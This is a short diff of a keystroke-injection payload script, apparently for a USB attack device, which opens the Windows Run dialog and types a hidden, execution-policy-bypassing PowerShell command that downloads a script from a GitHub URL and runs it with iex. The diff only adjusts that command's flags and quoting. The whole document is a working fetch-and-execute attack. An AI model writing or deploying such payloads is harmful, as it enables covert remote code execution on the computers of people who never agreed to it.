@@ -8,6 +8,6 @@ Q GUI r
 
 REM Run a powershell script from the url without downloading it
 Q DELAY 100
-Q STRING powershell -w -h -NoP -NonI -Exec Bypass (iwr -UseBasicParsing https://raw.githubusercontent.com/RylexOff/Prout-Script/main/prout_script.ps1).Content | iex
+Q STRING powershell -NoP -NonI -WindowStyle Hidden -Exec Bypass "(iwr -UseBasicParsing https://raw.githubusercontent.com/RylexOff/Prout-Script/main/prout_script.ps1).Content | iex"
 Q DELAY 100
 Q ENTER
